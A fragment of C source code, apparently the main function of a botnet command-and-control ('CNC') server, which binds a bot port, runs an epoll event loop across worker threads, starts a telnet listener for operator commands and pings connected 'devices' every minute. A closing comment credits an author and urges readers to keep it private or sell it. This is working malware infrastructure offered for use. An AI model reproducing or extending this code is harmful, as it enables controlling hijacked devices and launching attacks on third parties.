    //Bind To Bot Port
    BotListenFD = CBind(argv[1]);
    if(BotListenFD == -1) exit(0);
    else{ printf(""W"["G"+"W"] Binding To Port: "CY"%d"W"...\n", BotPort); }

    int BotSock;
    //Make NB Sock 
    BotSock = NBSock(BotListenFD);
    if(BotSock == -1) exit(0);
    else{ printf(""W"["Y"!"W"] NB Socket Created On Port: "CY"%d"W"...\n", BotPort); }

    //Sock Listen
    BotSock = listen(BotListenFD, SOMAXCONN);
    if(BotSock == -1){ perror("listen"); exit(0); }
    else{ printf(""W"["G"+"W"] Listener Now Monitoring Port: "CY"%d"W"...\n", BotPort); }
    
    //Create Epoll
    struct epoll_event event;
    EpollFD = epoll_create1(0);
    if(EpollFD == -1){ perror("epoll_create"); exit(0); }
    else{ printf(""W"["Y"Epoll"W"] Event Loop Created..."CR"\n"); }
    //Monitor Events
    event.data.fd = BotListenFD;
    event.events = EPOLLIN | EPOLLET; 
    BotSock = epoll_ctl(EpollFD, EPOLL_CTL_ADD, BotListenFD, &event);
    if(BotSock == -1){ perror("epoll_ctl"); exit(0); }
    //Run It On Thread(s)
    pthread_t thread[Threads + 2];
    while(Threads--) pthread_create(&thread[Threads + 2], NULL, &EpollEventLoop, (void *) NULL);
    printf(""W"["Y"Epoll"W"] Ready For I/O Interaction..."CR"\n");
    
    //Thread Tel Listener
    pthread_create(&thread[0], NULL, &Listener, BotPort);
    Threads = atoi(argv[2]); //Redefine Threads Because We Dimished Them While Threading The Epoll Loop
    printf(""W"["G"+"W"] CNC Worker Running On "CY"%d "W"Thread(s)..."CR"\n"W"["G"+"W"] "CY"Awaiting Commands On Port %d"W"...\n["G"+"W"]=======================================["G"+"W"]\x1b[0m\n", Threads, CNCPORT);

    //Ping Devices To Make Sure Socket Stays Alive
    while(1){ Broadcast("PING"); sleep(60); }

    close(BotListenFD);
    return EXIT_SUCCESS;
}
//EO2A37B
/* 
    Modifying This Code Is Permitted, However, Ripping Code From This/Removing Credits Is The Lowest Of The Low.
    KEEP IT PRIVATE; I'd Rather You Sell It Than Give It Away Or Post Somewhere.

    Gang
        - Tragedy
*/